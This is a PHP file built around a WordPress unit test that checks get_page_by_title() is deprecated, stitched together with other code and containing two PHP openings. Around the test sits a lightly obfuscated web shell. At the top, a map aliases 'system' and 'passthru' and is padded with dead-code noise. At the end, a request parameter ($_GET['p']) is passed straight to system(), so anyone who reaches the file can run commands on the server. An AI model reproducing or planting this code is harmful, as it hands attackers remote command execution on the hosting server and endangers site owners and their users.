<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * @group post
 *
 * @covers ::get_page_by_title
 */
class Tests_Post_GetPageByTitle extends WP_UnitTestCase {

	/**
	 * Tests that `get_page_by_title()` has been deprecated.
	 *
	 * @ticket 57041
	 *
	 * @expectedDeprecated get_page_by_title
	 */
	public function test_get_page_by_title_should_be_deprecated() {
		$this->assertNull( get_page_by_title( '#57041 Page' ) );
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>